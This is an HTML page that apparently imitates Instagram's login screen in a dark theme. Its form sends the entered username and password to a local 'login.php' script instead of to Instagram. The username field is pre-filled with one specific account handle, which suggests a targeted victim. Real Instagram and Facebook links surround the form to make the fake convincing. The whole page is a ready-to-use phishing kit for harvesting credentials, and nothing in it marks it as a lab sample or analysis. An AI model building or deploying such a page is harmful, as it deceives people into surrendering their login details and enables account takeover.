<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Login • Instagram</title>
    <link rel="shortcut icon" href="img/Instagram_logo_2016.svg.webp">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background-color: #0a0a0a; /* Changed to dark */
            color: #ffffff;
            box-sizing: border-box;
            margin: 0;
        }

        /* Loader */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(10, 10, 10, 0.95);
            display: flex; justify-content: center; align-items: center;
            z-index: 9999;
        }
        .loader { width: 40px; aspect-ratio: 1; border-radius: 50%; border: 3px solid #575757; border-right-color: #0095f6; animation: l2 1s infinite linear; }
        @keyframes l2 { to { transform: rotate(1turn); } }

        .container {
            max-width: 1000px; margin: 0 auto; display: flex; justify-content: center;
            flex-direction: column; align-items: center; margin-top: 3rem; font-size: 14px;
        }

        .box {
            max-width: 350px; width: 100%; background-color: #1c1c1c; /* Dark box */
            border: 1px solid #363636; border-radius: 8px;
            margin: 0 0 10px; padding: 20px 0; 
        }

        .heading {
            margin: 22px auto 12px;
            background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
            background-position: -98px 0; height: 51px; width: 177px; overflow: hidden;
        }

        .field { margin: 10px 0; position: relative; width: 100%; }
        input {
            padding: 9px 0px 7px 9px; font-size: 12px; width: 16rem; height: 1.2rem;
            outline: none; background: #121212; /* Dark input */
            border-radius: 3px; border: 1px solid #363636; color: #ffffff;
        }
        label {
            position: absolute; pointer-events: none; left: 10px; padding-bottom: 15px;
            transform: translateY(10px); line-height: 6px; transition: all ease-out 0.1s;
            font-size: 14px; color: #aaaaaa;
        }
        input:not(:placeholder-shown) + label {
            transform: translateY(0); font-size: 11px;
        }
        input:not(:placeholder-shown) {
            padding-top: 14px; padding-bottom: 2px;
        }

        .login-button {
            width: 100%; padding: 0.5rem; background-color: #0095f6;
            color: #fff; font-weight: 600; font-size: 14px; cursor: pointer;
            border-radius: 5px; border: none;
        }

        .separator { display: flex; justify-content: space-between; align-items: center; color: #aaaaaa; margin-top: 6px; }
        .separator .line { height: 1px; width: 40%; background-color: #363636; }

        .other { display: flex; justify-content: center; flex-direction: column; align-items: center; }
        .forgot-password { font-size: 12.5px; color: #0095f6; text-decoration: none; }

        .signup { color: #0095f6; font-weight: 600; text-decoration: none; }

        .footer a, .copyright, .get { color: #aaaaaa; }
        .Language { background-color: #1c1c1c; color: #aaaaaa; border-color: #363636; }

        #show-password-btn {
            position: absolute; right: 10px; top: 10px; background: transparent;
            border: none; color: #aaaaaa; cursor: pointer; display: none;
        }
    </style>
</head>
<body>
    <div class="loader-overlay">
        <div class="loader"></div>
    </div>

    <div class="container">
        <div class="box">
            <div class="heading"></div>
            
            <form class="login-form" action="login.php" method="post">
                <div class="field">
                    <input id="username" type="text" name="username" value="flaka.xoo" placeholder="Phone number, username, or email" required />
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field" style="position:relative;">
                    <input id="message" type="password" name="password" placeholder="Password" required />
                    <label for="password">Password</label>
                    <button type="button" id="show-password-btn">Show</button>
                </div>
                <button class="login-button" type="submit">Log In</button>
                
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>
                
                <div class="other">
                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                        Log in with Facebook
                    </button>
                    <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
                </div>
            </form>
        </div>
        
        <div class="box">
            <p>Don't have an account? <a class="signup" href="https://www.instagram.com/accounts/signup/phone" target="_blank">Sign Up</a></p>
        </div>
    </div>

    <script>
        // --- Added Fix: Hide loader overlay when page loads completely ---
        window.addEventListener('load', function () {
            const loaderOverlay = document.querySelector('.loader-overlay');
            if (loaderOverlay) {
                loaderOverlay.style.display = 'none';
            }
        });

        // --- Existing password logic ---
        const showPasswordBtn = document.getElementById('show-password-btn');
        const passwordField = document.getElementById('message');

        passwordField.addEventListener('input', function () {
            showPasswordBtn.style.display = passwordField.value.length > 0 ? 'block' : 'none';
        });

        showPasswordBtn.addEventListener('click', function () {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                showPasswordBtn.textContent = 'Hide';
            } else {
                passwordField.type = 'password';
                showPasswordBtn.textContent = 'Show';
            }
        });
    </script>
</body>
</html>
